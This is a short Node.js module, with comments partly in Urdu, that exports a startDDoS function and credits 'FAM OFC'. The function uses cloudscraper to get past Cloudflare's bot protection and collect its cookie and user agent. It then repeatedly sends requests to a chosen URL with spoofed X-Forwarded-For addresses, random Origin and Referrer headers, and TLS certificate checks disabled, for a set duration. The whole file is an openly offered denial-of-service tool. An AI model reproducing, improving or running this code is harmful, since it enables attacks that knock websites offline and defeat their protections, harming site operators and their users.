var cloudscraper = require('cloudscraper');
var axios = require('axios');
var https = require('https'); // ✅ HTTPS Agent شامل کریں
var randomstring = require("randomstring");

randomByte = function() {
    return Math.round(Math.random() * 256);
};

// ✅ Cloudflare Bypass & DDoS فنکشن
async function startDDoS(url, time) {
    let int = setInterval(async () => {
        var cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
        var useragent = 'proxy.txt';

        try {
            let response = await cloudscraper.get(url);
            let parsed = JSON.parse(JSON.stringify(response));
            cookie = parsed["request"]["headers"]["cookie"];
            useragent = parsed["request"]["headers"]["User-Agent"];
        } catch (error) {
            console.log('❌ Cloudflare Bypass Error:', error.message);
            return;
        }

        var rand = randomstring.generate({ length: 10, charset: 'abcdefghijklmnopqstuvwxyz0123456789' });
        var ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();

        const httpsAgent = new https.Agent({  
            rejectUnauthorized: false, // ✅ SSL/TLS Verify Disable
            keepAlive: true,
            minVersion: 'TLSv1'
        });

        const options = {
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            },
            timeout: 5000, // 5 sec timeout
            httpsAgent: httpsAgent // ✅ HTTPS Fix
        };

        try {
            await axios(options);
        } catch (error) {
            console.log("❌ Request Error:", error.message);
        }
    }, 1000);

    setTimeout(() => clearInterval(int), time * 1000);
    console.log(`✅ DDoS Attack Started on ${url} | Duration: ${time} seconds`);
    console.log(`🔥 Powered by FAM OFC`);
}

module.exports = { startDDoS };
